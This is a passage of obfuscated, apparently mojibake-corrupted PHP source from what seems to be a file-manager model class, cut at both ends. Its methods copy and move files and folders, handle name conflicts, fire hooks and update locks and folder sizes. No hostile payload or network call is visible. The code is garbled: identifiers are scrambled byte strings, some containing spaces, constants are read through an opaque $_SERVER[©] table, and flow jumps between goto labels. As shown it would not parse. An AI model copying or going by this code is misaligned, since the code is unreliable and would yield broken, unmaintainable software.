$AìİËÁÔàì, !1); } } } else { if ($E§§¬˜Ì½Á == REPEAT_RENAME || $E§§¬˜Ì½Á == REPEAT_RENAME_FOLDER) { $F¡ª­¦ÖïÇ = $this->fileNameAutoCache($C°æ¿øåòö, $F¡ª­¦ÖïÇ, $E§§¬˜Ì½Á, $C¼‡—õÜâË); $C«ö¯ÅÕÌ = $this->_copyCreate($a¹î‰ÚƒŠÊ, $C°æ¿øåòö, $F¡ª­¦ÖïÇ, $AìİËÁÔàì); } else { if ($E§§¬˜Ì½Á == REPEAT_REPLACE) { $b¬œÏŒ›¢Å = $this->sourceInfoCache($cáˆÁÑ‹Ü†); $b‡Ôù•ŠŒ“ = $this->fileHistory($b¬œÏŒ›¢Å, $Aíê´‚¸¦Ï[$aß‹·šŒ[427]], $Aíê´‚¸¦Ï[$aß‹·šŒ[87]]); if ($b‡Ôù•ŠŒ“) { $AìİËÁÔàì[$aß‹·šŒ[509]][] = $Aíê´‚¸¦Ï[$aß‹·šŒ[427]]; } } else { if ($E§§¬˜Ì½Á == REPEAT_SKIP) { } } } Hook::trigger($aß‹·šŒ[514], array($aß‹·šŒ[515], $Aíê´‚¸¦Ï, 0)); } goto Fù‰ÂõÙÕË; FÂğÓ˜îğŸ: } private function _copyCreate($FÂ›–Õ»Òà, $eïŞÑ¡¼Ø, $d‰·ˆ¼ê«, &$fÙæ¿°›™Ô) { goto dôªŞƒéÒÁ; eóÊ¶ò…™„: $this->_childrenListAll($FÂ›–Õ»Òà, $eƒáÈØ±·); $Fñ‚¬¸¿›ù = count($eƒáÈØ±·); if ($Fñ‚¬¸¿›ù == 0) { return $Dò©ç”ŒÎÍ; } goto d­¶õŒ™Ñ; aÉÍ½‰»’å: $a‰»Á¤ÄĞˆ[$FÂ›–Õ»Òà] = $Dò©ç”ŒÎÍ; $e´‚¶˜ƒ±· = array(); $c‰ßÑé¸‚ = array(); goto Eñõ¢‰ÖÛ„; A½‰‚¨: $B·Ä‰ µÑÁ = $this->_makeItemData($A—¶¨â‘²Õ, $cğä’•ˆ¡À, $d‰·ˆ¼ê«); Hook::trigger($d¼›­Ÿ…òÃ[516], $B·Ä‰ µÑÁ); Hook::trigger($d¼›­Ÿ…òÃ[517], array($d¼›­Ÿ…òÃ[518], $B·Ä‰ µÑÁ, 0)); goto aŞËÎ†•½ç; aªí«¾Åµò: $this->chunkEventSet($d¼›­Ÿ…òÃ[523], array($d¼›­Ÿ…òÃ[524], $B·Ä‰ µÑÁ, $Fñ‚¬¸¿›ù)); $this->saveAll($c‰ßÑé¸‚); return $Dò©ç”ŒÎÍ; goto EÊã³»’–‡; d­¶õŒ™Ñ: $Eç¤ø¸ó‚ñ = $this->sourceInfo($Dò©ç”ŒÎÍ); foreach ($eƒáÈØ±· as $D‰æ”ĞíÀÉ) { $Aùå„»Õ¿› = $this->_makeItemData($D‰æ”ĞíÀÉ, $Eç¤ø¸ó‚ñ, $D‰æ”ĞíÀÉ[$d¼›­Ÿ…òÃ[38]]); $Aùå„»Õ¿›[$d¼›­Ÿ…òÃ[467]] = $D‰æ”ĞíÀÉ[$d¼›­Ÿ…òÃ[467]]; $e¢æ¤¯áàø[] = $Aùå„»Õ¿›; } $this->chunkEventSet($d¼›­Ÿ…òÃ[519], array($d¼›­Ÿ…òÃ[520], $B·Ä‰ µÑÁ, $Fñ‚¬¸¿›ù)); goto aƒ‚×§ìæ‘; Eñõ¢‰ÖÛ„: foreach ($BÖ¹¿ÏÁÕ¤ as $D‰æ”ĞíÀÉ) { $c…§ÃĞ–±‡ = $D‰æ”ĞíÀÉ[$d¼›­Ÿ…òÃ[377]]; $e¶©íìÈ­¨ = $this->_childrenMatch($a‰»Á¤ÄĞˆ, $D‰æ”ĞíÀÉ, $Eç¤ø¸ó‚ñ); $e´‚¶˜ƒ±·[] = array($d¼›­Ÿ…òÃ[377], $c…§ÃĞ–±‡, $d¼›­Ÿ…òÃ[469], $e¶©íìÈ­¨[$d¼›­Ÿ…òÃ[469]]); $c‰ßÑé¸‚[] = array($d¼›­Ÿ…òÃ[377], $c…§ÃĞ–±‡, $d¼›­Ÿ…òÃ[467], $e¶©íìÈ­¨[$d¼›­Ÿ…òÃ[467]]); $this->_copyApplyMeta($D‰æ”ĞíÀÉ, $fÙæ¿°›™Ô); if ($D‰æ”ĞíÀÉ[$d¼›­Ÿ…òÃ[378]] != $d¼›­Ÿ…òÃ[93]) { $fÙæ¿°›™Ô[$d¼›­Ÿ…òÃ[509]][] = $D‰æ”ĞíÀÉ[$d¼›­Ÿ…òÃ[427]]; } } $this->chunkEventSet($d¼›­Ÿ…òÃ[521], array($d¼›­Ÿ…òÃ[522], $B·Ä‰ µÑÁ, $Fñ‚¬¸¿›ù)); $this->saveAll($e´‚¶˜ƒ±·); goto aªí«¾Åµò; eÏäÊ÷œ‡‚: if ($A—¶¨â‘²Õ[$d¼›­Ÿ…òÃ[378]] != $d¼›­Ÿ…òÃ[93]) { $fÙæ¿°›™Ô[$d¼›­Ÿ…òÃ[509]][] = $A—¶¨â‘²Õ[$d¼›­Ÿ…òÃ[427]]; return $Dò©ç”ŒÎÍ; } $eƒáÈØ±· = array(); $e¢æ¤¯áàø = array(); goto eóÊ¶ò…™„; aƒ‚×§ìæ‘: $this->addAll($e¢æ¤¯áàø, array(), !1); $BÖ¹¿ÏÁÕ¤ = $this->where(array($d¼›­Ÿ…òÃ[469] => $Dò©ç”ŒÎÍ))->select(); $a‰»Á¤ÄĞˆ = $this->_childrenMakeRelation($eƒáÈØ±·, $BÖ¹¿ÏÁÕ¤); goto aÉÍ½‰»’å; aŞËÎ†•½ç: $Dò©ç”ŒÎÍ = $this->add($B·Ä‰ µÑÁ); $d»Ò¹íÈî† = array($d¼›­Ÿ…òÃ[377] => $Dò©ç”ŒÎÍ, $d¼›­Ÿ…òÃ[38] => $d‰·ˆ¼ê«); $this->_copyApplyMeta($d»Ò¹íÈî†, $fÙæ¿°›™Ô); goto eÏäÊ÷œ‡‚; dôªŞƒéÒÁ: $d¼›­Ÿ…òÃ =& $_SERVER[©]; $A—¶¨â‘²Õ = $this->sourceInfoCache($FÂ›–Õ»Òà); $cğä’•ˆ¡À = $this->sourceInfoCache($eïŞÑ¡¼Ø); goto A½‰‚¨; EÊã³»’–‡: } private function _childrenMakeRelation($A­”ïÎå, $c”É¯Ÿİé) { $BÇÏÊíİÏº =& $_SERVER[©]; $Fä“æ›‹öï = array(); $dÁçˆ¶µ°„ = array(); foreach ($A­”ïÎå as $AÂ™™°Ÿºƒ) { $aªŒáÒ°¾­ = $AÂ™™°Ÿºƒ[$BÇÏÊíİÏº[38]] . $BÇÏÊíİÏº[18] . $AÂ™™°Ÿºƒ[$BÇÏÊíİÏº[467]]; $Fä“æ›‹öï[$aªŒáÒ°¾­] = $AÂ™™°Ÿºƒ[$BÇÏÊíİÏº[377]]; } foreach ($c”É¯Ÿİé as $AÂ™™°Ÿºƒ) { $aªŒáÒ°¾­ = $AÂ™™°Ÿºƒ[$BÇÏÊíİÏº[38]] . $BÇÏÊíİÏº[18] . $AÂ™™°Ÿºƒ[$BÇÏÊíİÏº[467]]; $EÛƒ«¹Äô = $Fä“æ›‹öï[$aªŒáÒ°¾­]; $dÁçˆ¶µ°„[$EÛƒ«¹Äô] = $AÂ™™°Ÿºƒ[$BÇÏÊíİÏº[377]]; } return $dÁçˆ¶µ°„; } private function _childrenMatch($C…ƒä™¤‘À, $F¤º‚‚‰Ä‹, $EÊ²ÑˆŸÕº) { goto D×³Ôä‡ô«; BóäÙÁ ¾Ë: $fšª¦ÙÜí = $e‹Å‘ÜÍ¥¢[count($e‹Å‘ÜÍ¥¢) - 1]; return array($C¨‘çÇÖÕ°[469] => $fšª¦ÙÜí, $C¨‘çÇÖÕ°[467] => $fºÜ³¼Òôˆ); goto aƒíË³ÛÏË; E·§ğÒçÒ¬: foreach ($EÀİø·˜Áœ as $C­­¥ğ˜æÍ) { if (isset($C…ƒä™¤‘À[$C­­¥ğ˜æÍ])) { $fºÜ³¼Òôˆ .= $C…ƒä™¤‘À[$C­­¥ğ˜æÍ] . $C¨‘çÇÖÕ°[525]; } } $fºÜ³¼Òôˆ = rtrim($fºÜ³¼Òôˆ, $C¨‘çÇÖÕ°[57]) . $C¨‘çÇÖÕ°[57]; $e‹Å‘ÜÍ¥¢ = $this->parentLevelArray($fºÜ³¼Òôˆ); goto BóäÙÁ ¾Ë; D×³Ôä‡ô«: $C¨‘çÇÖÕ° =& $_SERVER[©]; $fºÜ³¼Òôˆ = $EÊ²ÑˆŸÕº[$C¨‘çÇÖÕ°[467]]; $EÀİø·˜Áœ = $this->parentLevelArray($F¤º‚‚‰Ä‹[$C¨‘çÇÖÕ°[467]]); goto E·§ğÒçÒ¬; aƒíË³ÛÏË: } private function _makeItemData($Eğœ¬›É³, $F¿‰Ãö…±á, $Aß¢ªÒÚƒƒ) { $DöÔ›¤…”¸ =& $_SERVER[©]; $D–Éâ¯“ø¡ = array($DöÔ›¤…”¸[526] => $Eğœ¬›É³[$DöÔ›¤…”¸[378]], $DöÔ›¤…”¸[394] => $Aß¢ªÒÚƒƒ, $DöÔ›¤…”¸[527] => $Eğœ¬›É³[$DöÔ›¤…”¸[380]], $DöÔ›¤…”¸[428] => $Eğœ¬›É³[$DöÔ›¤…”¸[427]], $DöÔ›¤…”¸[528] => $Eğœ¬›É³[$DöÔ›¤…”¸[87]], $DöÔ›¤…”¸[529] => $F¿‰Ãö…±á[$DöÔ›¤…”¸[379]], $DöÔ›¤…”¸[530] => $F¿‰Ãö…±á[$DöÔ›¤…”¸[464]], $DöÔ›¤…”¸[531] => USER_ID, $DöÔ›¤…”¸[532] => USER_ID, $DöÔ›¤…”¸[376] => $F¿‰Ãö…±á[$DöÔ›¤…”¸[377]], $DöÔ›¤…”¸[533] => $F¿‰Ãö…±á[$DöÔ›¤…”¸[467]] . $F¿‰Ãö…±á[$DöÔ›¤…”¸[377]] . $DöÔ›¤…”¸[57], $DöÔ›¤…”¸[404] => 0, $DöÔ›¤…”¸[534] => $DöÔ›¤…”¸[43]); return $D–Éâ¯“ø¡; } private function _copyApplyMeta($BÅŠåêÂ’¥, &$c¸ÕĞêªÆÓ) { $B„ğß„ò°ª =& $_SERVER[©]; $f×†·†„íÅ = $BÅŠåêÂ’¥[$B„ğß„ò°ª[377]]; $BÃ ¾Â‡ª = $BÅŠåêÂ’¥[$B„ğß„ò°ª[38]]; if (!isset($BÅŠåêÂ’¥[$B„ğß„ò°ª[535]]) || !$BÅŠåêÂ’¥[$B„ğß„ò°ª[535]] || $BÅŠåêÂ’¥[$B„ğß„ò°ª[535]] == $B„ğß„ò°ª[476]) { $c¸ÕĞêªÆÓ[$B„ğß„ò°ª[511]][] = array($B„ğß„ò°ª[377], $f×†·†„íÅ, $B„ğß„ò°ª[535], short_id($f×†·†„íÅ)); } if (Input::check($BÃ ¾Â‡ª, $B„ğß„ò°ª[536])) { $c¸ÕĞêªÆÓ[$B„ğß„ò°ª[510]][] = array($B„ğß„ò°ª[377] => $f×†·†„íÅ, $B„ğß„ò°ª[99] => $B„ğß„ò°ª[424], $B„ğß„ò°ª[368] => str_replace($B„ğß„ò°ª[60], $B„ğß„ò°ª[43], Pinyin::encode($BÃ ¾Â‡ª))); $c¸ÕĞêªÆÓ[$B„ğß„ò°ª[510]][] = array($B„ğß„ò°ª[377] => $f×†·†„íÅ, $B„ğß„ò°ª[99] => $B„ğß„ò°ª[423], $B„ğß„ò°ª[368] => Pinyin::encode($BÃ ¾Â‡ª, $B„ğß„ò°ª[537])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($b—„Õ¶’°) { goto aÆ®Íµá; cò–Š¡Âáç: $c†ƒÚñ”­¢ = array($bñÛÅ¤“ ›[467] => array($bñÛÅ¤“ ›[491], $BŠ™İ­‚[$bñÛÅ¤“ ›[467]] . $b—„Õ¶’° . $bñÛÅ¤“ ›[492]), $bñÛÅ¤“ ›[405] => $this->targetIsDelete); $Fßí„…¾î‚ = $this->field($b¿Á¡øíÄ )->where($c†ƒÚñ”­¢)->select(); if (!$Fßí„…¾î‚) { return; } goto a•„¤àÎ©§; aÆ®Íµá: $bñÛÅ¤“ › =& $_SERVER[©]; $BŠ™İ­‚ = $this->sourceInfo($b—„Õ¶’°); $b¿Á¡øíÄ  = $bñÛÅ¤“ ›[538]; goto cò–Š¡Âáç; a•„¤àÎ©§: $Fßí„…¾î‚ = array_to_keyvalue($Fßí„…¾î‚, $bñÛÅ¤“ ›[377]); foreach ($Fßí„…¾î‚ as $AÅ£Õ»àØ) { $FÜÚÅ²£» = $AÅ£Õ»àØ[$bñÛÅ¤“ ›[469]]; $b—„Õ¶’° = $AÅ£Õ»àØ[$bñÛÅ¤“ ›[377]]; if (!isset($this->_childrenListCache[$b—„Õ¶’°]) && $AÅ£Õ»àØ[$bñÛÅ¤“ ›[378]] == $bñÛÅ¤“ ›[93]) { $this->_childrenListCache[$b—„Õ¶’°] = array(); } if (!isset($this->_childrenListCache[$FÜÚÅ²£»])) { $this->_childrenListCache[$FÜÚÅ²£»] = array(); } $this->_childrenListCache[$FÜÚÅ²£»][$b—„Õ¶’°] = $AÅ£Õ»àØ; $this->_childrenItemCache[$b—„Õ¶’°] = $AÅ£Õ»àØ; } goto ağ˜Ø¯Èó»; ağ˜Ø¯Èó»: } private function _childrenListAll($d§ö¿²¿äê, &$B–ÍÑµö¡) { $eîÍ“±Ú½ =& $_SERVER[©]; if (!isset($this->_childrenListCache[$d§ö¿²¿äê])) { return; } $b‘“Ø÷Îã‰ = $this->_childrenListCache[$d§ö¿²¿äê]; foreach ($b‘“Ø÷Îã‰ as $e¬ÈàŠ–‡È => $c…Îêµ¶¨) { $B–ÍÑµö¡[$e¬ÈàŠ–‡È] = $c…Îêµ¶¨; if ($c…Îêµ¶¨[$eîÍ“±Ú½[378]] == $eîÍ“±Ú½[93]) { $this->_childrenListAll($e¬ÈàŠ–‡È, $B–ÍÑµö¡); } } } private function sourceInfoCache($Fİªäª‘ÓÒ) { if (isset($this->_childrenItemCache[$Fİªäª‘ÓÒ])) { return $this->_childrenItemCache[$Fİªäª‘ÓÒ]; } return $this->sourceInfo($Fİªäª‘ÓÒ); } private function _childrenList($b«Å¬—ãø¦) { if (isset($this->_childrenListCache[$b«Å¬—ãø¦])) { return $this->_childrenListCache[$b«Å¬—ãø¦]; } return $this->_childrenListSelect($b«Å¬—ãø¦); } private function _childrenListSelect($d¥ÎĞĞä) { goto A¬»ñŒºŞ‰; D¨‡¸Œç¤: foreach ($cø´â›‹Î• as $d¥ÎĞĞä => $dç„ËäÑøÁ) { $this->_childrenItemCache[$d¥ÎĞĞä] = $dç„ËäÑøÁ; } return $cø´â›‹Î•; goto E¨©×ÀÌ§ƒ; A¬»ñŒºŞ‰: $f”³Š®ê¦ì =& $_SERVER[©]; $bíæ ƒİ¢ = array($f”³Š®ê¦ì[469] => $d¥ÎĞĞä, $f”³Š®ê¦ì[405] => $this->targetIsDelete); $E£ˆÊŠ’ÍÕ = $this->where($bíæ ƒİ¢)->select(); goto f‰˜˜Ïê¶è; f‰˜˜Ïê¶è: $E£ˆÊŠ’ÍÕ = $E£ˆÊŠ’ÍÕ ? $E£ˆÊŠ’ÍÕ : array(); $cø´â›‹Î• = array_to_keyvalue($E£ˆÊŠ’ÍÕ, $f”³Š®ê¦ì[377]); $this->_childrenListCache[$d¥ÎĞĞä] = $cø´â›‹Î•; goto D¨‡¸Œç¤; E¨©×ÀÌ§ƒ: } private function fileNameExistCache($FÄÚŞèßÑƒ, $E˜ÑÄ—âè¸) { $b²±ñ¡¦ =& $_SERVER[©]; $E˜ÑÄ—âè¸ = strtolower($E˜ÑÄ—âè¸); $D±ÅÇ¼İÔÏ = $this->_childrenList($FÄÚŞèßÑƒ); foreach ($D±ÅÇ¼İÔÏ as $f¿†ø© ) { if ($E˜ÑÄ—âè¸ == strtolower($f¿†ø© [$b²±ñ¡¦[38]])) { return $f¿†ø© [$b²±ñ¡¦[377]]; } } return !1; } private function fileNameAutoCache($cˆ˜Ò˜Óæ, $DĞø˜²šã–, $E™á—¯¸ğÁ, $aÓ½»ã³Ü») { $e’‡›²ò•† =& $_SERVER[©]; $BİßˆÑˆÕ¹ = $this->_childrenList($cˆ˜Ò˜Óæ); $D…ô‰óœÅ„ = array_to_keyvalue($BİßˆÑˆÕ¹, $e’‡›²ò•†[43], $e’‡›²ò•†[38]); return $this->fileNameAutoGet($D…ô‰óœÅ„, $DĞø˜²šã–, $E™á—¯¸ğÁ, $aÓ½»ã³Ü»); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($D¿ŞØÚ’“, $CµÉĞ·¾³Û, $e©ã„¹ÔÌ = REPEAT_REPLACE, $FŒÆí’¢’é = '') { goto cÌºÖ¿ôÅ; dñÚ‚Ã‡•: $this->lockMoveEnd($D¿ŞØÚ’“); $this->lockWriteEnd($CµÉĞ·¾³Û, $fÁ»ÙÌ‰‘Ï); $this->folderSizeReset($c²ˆ£ƒô¦¡[$D°³¥¹‹[469]]); goto bªÊš¡õµ½; bªÊš¡õµ½: $this->folderSizeReset($CµÉĞ·¾³Û); $E‘ØÈÏİÛÇ = array($c²ˆ£ƒô¦¡[$D°³¥¹‹[469]], $CµÉĞ·¾³Û); if ($c²ˆ£ƒô¦¡[$D°³¥¹‹[378]] == $D°³¥¹‹[93]) { $E‘ØÈÏİÛÇ[] = $D¿ŞØÚ’“; } goto AÙ¨ˆÔœí¥; b²—œéô­¯: if ($c²ˆ£ƒô¦¡[$D°³¥¹‹[378]] == $D°³¥¹‹[93] && $f†–ÉöÖàİ) { $this->folderSizeResetChildren($F”†ÙÒÈàÎ); } Model($D°³¥¹‹[177])->linkAdd($Dá«Ë¨†Ë[$D°³¥¹‹[509]]); if ($f†–ÉöÖàİ && $Dá«Ë¨†Ë[$D°³¥¹‹[541]]) { $this->removeNow($D¿ŞØÚ’“, !1); } goto dñÚ‚Ã‡•; bÏÙ°¼ÑÅ£: $this->lockWriteStart($CµÉĞ·¾³Û, $fÁ»ÙÌ‰‘Ï); $Dá«Ë¨†Ë = array($D°³¥¹‹[509] => array(), $D°³¥¹‹[541] => !1); $this->clearShare($D¿ŞØÚ’“, $CµÉĞ·¾³Û); goto DÓ‰ŠôÈÂ; d‘êÑÊĞ§Ã: if ($c²ˆ£ƒô¦¡[$D°³¥¹‹[469]] == $cî×à×Ï‰Ã[$D°³¥¹‹[377]]) { if ($c²ˆ£ƒô¦¡[$D°³¥¹‹[405]] == $D°³¥¹‹[93]) { Model($D°³¥¹‹[403])->restore(array($D¿ŞØÚ’“)); } return $D¿ŞØÚ’“; } $D¬¡ˆ•ğâ— = $this->pathInfoMore($D¿ŞØÚ’“); if ($this->isParentOf($D¿ŞØÚ’“, $CµÉĞ·¾³Û)) { return !1; } goto F£“‹ÔÉ¶Í; d‡ÄïÍ©À: return $F”†ÙÒÈàÎ; goto dí§”…›µ¦; cÌºÖ¿ôÅ: $D°³¥¹‹ =& $_SERVER[©]; $c²ˆ£ƒô¦¡ = $this->sourceInfo($D¿ŞØÚ’“); $cî×à×Ï‰Ã = $this->sourceInfo($CµÉĞ·¾³Û); goto d‘êÑÊĞ§Ã; DÓ‰ŠôÈÂ: $f†–ÉöÖàİ = $this->fileNameExistCache($CµÉĞ·¾³Û, $c²ˆ£ƒô¦¡[$D°³¥¹‹[38]]); $F”†ÙÒÈàÎ = $this->_move($D¿ŞØÚ’“, $CµÉĞ·¾³Û, $e©ã„¹ÔÌ, $Dá«Ë¨†Ë, $FŒÆí’¢’é); $this->sourceCacheClear(); goto b²—œéô­¯; F£“‹ÔÉ¶Í: if (!$c²ˆ£ƒô¦¡ || !$cî×à×Ï‰Ã || $cî×à×Ï‰Ã[$D°³¥¹‹[378]] != $D°³¥¹‹[93]) { return !1; } Hook::trigger($D°³¥¹‹[539], $D¬¡ˆ•ğâ—); $this->targetIsDelete = intval($c²ˆ£ƒô¦¡[$D°³¥¹‹[405]]); goto a’·ˆ›İÏÎ; AÙ¨ˆÔœí¥: $this->updateModifyTime($E‘ØÈÏİÛÇ); Model($D°³¥¹‹[513])->eventMove($D¿ŞØÚ’“, $c²ˆ£ƒô¦¡[$D°³¥¹‹[469]], $CµÉĞ·¾³Û); Hook::trigger($D°³¥¹‹[540], $D¬¡ˆ•ğâ—); goto d‡ÄïÍ©À; a’·ˆ›İÏÎ: if ($c²ˆ£ƒô¦¡[$D°³¥¹‹[469]] == $CµÉĞ·¾³Û && $FŒÆí’¢’é != $c²ˆ£ƒô¦¡[$D°³¥¹‹[38]]) { $BË²æ†ƒ¬Û = $this->fileNameExist($CµÉĞ·¾³Û, $FŒÆí’¢’é); if ($BË²æ†ƒ¬Û && $c²ˆ£ƒô¦¡[$D°³¥¹‹[378]] == $D°³¥¹‹[476]) { goto cğã…„ë Œ; A–Ê¥ˆİÂ“: $this->removeNow($D¿ŞØÚ’“, !1); $this->folderSizeReset($CµÉĞ·¾³Û); Hook::trigger($D°³¥¹‹[540], $D¬¡ˆ•ğâ—); goto bò‹áâ¯•ğ; bò‹áâ¯•ğ: return $BË²æ†ƒ¬Û; goto B½é‰ò´É”; cğã…„ë Œ: $Fö—Ğë©¿ = $this->sourceInfo($BË²æ†ƒ¬Û); $EÁŸÛĞ†Í = $this->fileHistory($Fö—Ğë©¿, $c²ˆ£ƒô¦¡[$D°³¥¹‹[427]], $c²ˆ£ƒô¦¡[$D°³¥¹‹[87]]); if (!$EÁŸÛĞ†Í) { Model($D°³¥¹‹[430])->remove($c²ˆ£ƒô¦¡[$D°³¥¹‹[427]]); } goto A–Ê¥ˆİÂ“; B½é‰ò´É”: } } $fÁ»ÙÌ‰‘Ï = $FŒÆí’¢’é ? $FŒÆí’¢’é : $c²ˆ£ƒô¦¡[$D°³¥¹‹[38]]; $this->lockMoveStart($D¿ŞØÚ’“); goto bÏÙ°¼ÑÅ£; dí§”…›µ¦: } private function _move($FÄ†İÈ—Ş³, $dí¶é÷öÚÜ, $b‰œŠöî¾‘, &$C¿¦ÏÙ¤•, $cë¼ÁâË´¢ = '') { goto bÃµº¡µÛ; dê„©Úšé: $AÇæ‡¹­ªó = $cë¼ÁâË´¢ ? $cë¼ÁâË´¢ : $aî ÁÁ†ß[$cäÆË…ç³Ÿ[38]]; $Bƒé‚õ²ß‚ = $this->fileNameExistCache($dí¶é÷öÚÜ, $AÇæ‡¹­ªó); $this->lockMoveStart($FÄ†İÈ—Ş³); goto BÈÊñëÀÌ; cçêøÊ‘: $bšáƒæğÇ– = !1; if ($déğÇïæ¥ç) { if ($b‰œŠöî¾‘ == REPEAT_RENAME_FOLDER) { $AÇæ‡¹­ªó = $this->fileNameAuto($dí¶é÷öÚÜ, $AÇæ‡¹­ªó, $b‰œŠöî¾‘, $déğÇïæ¥ç); $bØÅä‰ Œ = $this->_moveForce($FÄ†İÈ—Ş³, $dí¶é÷öÚÜ, $AÇæ‡¹­ªó); } else { if ($b‰œŠöî¾‘ == REPEAT_RENAME_FOLDER) { $b‰œŠöî¾‘ = REPEAT_RENAME; } $bå‡…¥´êã = $this->_childrenListSelect($FÄ†İÈ—Ş³); foreach ($bå‡…¥´êã as $Dâ½ªØ•½Å) { $this->_move($Dâ½ªØ•½Å[$cäÆË…ç³Ÿ[377]], $Bƒé‚õ²ß‚, $b‰œŠöî¾‘, $C¿¦ÏÙ¤•); } $bšáƒæğÇ– = !0; } } else { if ($b‰œŠöî¾‘ == REPEAT_SKIP) { $bšáƒæğÇ– = !0; } else { if ($b‰œŠöî¾‘ == REPEAT_RENAME || $b‰œŠöî¾‘ == REPEAT_RENAME_FOLDER) { $AÇæ‡¹­ªó = $this->fileNameAuto($dí¶é÷öÚÜ, $AÇæ‡¹­ªó, $b‰œŠöî¾‘, $déğÇïæ¥ç); $bØÅä‰ Œ = $this->_moveForce($FÄ†İÈ—Ş³, $dí¶é÷öÚÜ, $AÇæ‡¹­ªó); } else { if ($b‰œŠöî¾‘ == REPEAT_REPLACE) { $dóÏ»ïÇ = $this->sourceInfoCache($Bƒé‚õ²ß‚); $BëëØ´à÷à = $this->fileHistory($dóÏ»ïÇ, $aî ÁÁ†ß[$cäÆË…ç³Ÿ[427]], $aî ÁÁ†ß[$cäÆË…ç³Ÿ[87]]); if ($BëëØ´à÷à) { $C¿¦ÏÙ¤•[$cäÆË…ç³Ÿ[509]][] = $aî ÁÁ†ß[$cäÆË…ç³Ÿ[427]]; } else { $bšáƒæğÇ– = !0; } } } } } if ($bšáƒæğÇ– && !$C¿¦ÏÙ¤•[$cäÆË…ç³Ÿ[541]]) { $C¿¦ÏÙ¤•[$cäÆË…ç³Ÿ[541]] = !0; } goto f‡¤õßÖØ; BÈÊñëÀÌ: $this->lockWriteStart($dí¶é÷öÚÜ, $AÇæ‡¹­ªó); if (!$Bƒé‚õ²ß‚) { return $this->_moveForce($FÄ†İÈ—Ş³, $dí¶é÷öÚÜ, $AÇæ‡¹­ªó); } $bØÅä‰ Œ = $Bƒé‚õ²ß‚; goto cçêøÊ‘; bÃµº¡µÛ: $cäÆË…ç³Ÿ =& $_SERVER[©]; $aî ÁÁ†ß = $this->sourceInfo($FÄ†İÈ—Ş³); $déğÇïæ¥ç = $aî ÁÁ†ß[$cäÆË…ç³Ÿ[378]] == $cäÆË…ç³Ÿ[93]; goto dê„©Úšé; f‡¤õßÖØ: return $bØÅä‰ Œ; goto f–ßÆ¼ƒ¥; f–ßÆ¼ƒ¥: } private function _moveForce($d¶ì†§Ò›, $bçÅ÷îˆùõ, $a”ŸªÊÒØÂ) { goto C„¸”„øª; eİß¾¹·©: if (!$fÓ·…Œ­ÂË) { Model($aÒÍäŠ¼ùà[462])->authClear($d¶ì†§Ò›); } $c×¹‚ß—‹¦ = $bÒàĞ«ùì[$aÒÍäŠ¼ùà[405]] == $aÒÍäŠ¼ùà[93] && $Aö£ÜÀ¸ç»[$aÒÍäŠ¼ùà[405]] != $aÒÍäŠ¼ùà[93]; if ($c×¹‚ß—‹¦) { $dö½À¯çĞº[$aÒÍäŠ¼ùà[404]] = 0; } goto Bá‚×ß°á; D—ğ —À: $bˆÉ“§„êÂ = $bÒàĞ«ùì[$aÒÍäŠ¼ùà[378]] == $aÒÍäŠ¼ùà[93]; $dö½À¯çĞº = array($aÒÍäŠ¼ùà[376] => $Aö£ÜÀ¸ç»[$aÒÍäŠ¼ùà[377]], $aÒÍäŠ¼ùà[533] => $Aö£ÜÀ¸ç»[$aÒÍäŠ¼ùà[467]] . $Aö£ÜÀ¸ç»[$aÒÍäŠ¼ùà[377]] . $aÒÍäŠ¼ùà[57], $aÒÍäŠ¼ùà[529] => $Aö£ÜÀ¸ç»[$aÒÍäŠ¼ùà[379]], $aÒÍäŠ¼ùà[530] => $Aö£ÜÀ¸ç»[$aÒÍäŠ¼ùà[464]], $aÒÍäŠ¼ùà[532] => USER_ID, $aÒÍäŠ¼ùà[394] => $a”ŸªÊÒØÂ); $fÓ·…Œ­ÂË = $bÒàĞ«ùì[$aÒÍäŠ¼ùà[379]] == SourceModel::TYPE_GROUP && $Aö£ÜÀ¸ç»[$aÒÍäŠ¼ùà[379]] == SourceModel::TYPE_GROUP && $bÒàĞ«ùì[$aÒÍäŠ¼ùà[464]] == $Aö£ÜÀ¸ç»[$aÒÍäŠ¼ùà[464]]; goto eİß¾¹·©; C„¸”„øª: $aÒÍäŠ¼ùà =& $_SERVER[©]; $bÒàĞ«ùì = $this->sourceInfo($d¶ì†§Ò›); $Aö£ÜÀ¸ç» = $this->sourceInfo($bçÅ÷îˆùõ); goto D—ğ —À; Bá‚×ß°á: if ($bˆÉ“§„êÂ) { $C¡ÂÚåâ¸¢ = array($aÒÍäŠ¼ùà[533] => array($aÒÍäŠ¼ùà[491], $bÒàĞ«ùì[$aÒÍäŠ¼ùà[467]] . $bÒàĞ«ùì[$aÒÍäŠ¼ùà[377]] . $aÒÍäŠ¼ùà[492])); $aà’õ¶Ûµˆ = $bÒàĞ«ùì[$aÒÍäŠ¼ùà[467]] . $bÒàĞ«ùì[$aÒÍäŠ¼ùà[377]] . $aÒÍäŠ¼ùà[57]; $cİ³¢¾Œøæ = $Aö£ÜÀ¸ç»[$aÒÍäŠ¼ùà[467]] . $Aö£ÜÀ¸ç»[$aÒÍäŠ¼ùà[377]] . $aÒÍäŠ¼ùà[57] . $bÒàĞ«ùì[$aÒÍäŠ¼ùà[377]] . $aÒÍäŠ¼ùà[57]; $C¦ËÖ‰Ÿã£ = array($aÒÍäŠ¼ùà[533] => array($aÒÍäŠ¼ùà[542], "\162\x65\x70\154\x61\143\145\50\x70\141\x72\x65\x6e\x74\x4c\x65\166\x65\x6c\x2c\47{$aà’õ¶Ûµˆ}\47\54\47{$cİ³¢¾Œøæ}\x27\51"), $aÒÍäŠ¼ùà[529] => $Aö£ÜÀ¸ç»[$aÒÍäŠ¼ùà[379]], $aÒÍäŠ¼ùà[530] => $Aö£ÜÀ¸ç»[$aÒÍäŠ¼ùà[464]]); if ($c×¹‚ß—‹¦) { $C¦ËÖ‰Ÿã£[$aÒÍäŠ¼ùà[404]] = 0; } $this->where($C¡ÂÚåâ¸¢)->data($C¦ËÖ‰Ÿã£)->save(); } $this->where(array($aÒÍäŠ¼ùà[391] => $d¶ì†§Ò›))->data($dö½À¯çĞº)->save(); return $d¶ì†§Ò›; goto cà±¬Œù·; cà±¬Œù·: } private function clearShare($d‡—ÄİĞ¹Ñ, $EŠª¼á÷×ò) { goto dğ¦Ù³°; FÃŸáŒãå: if ($C¹ï©œØ[$Eó¦‚†……[464]] == $C¹ÁØ˜­¤¸[$Eó¦‚†……[464]] && 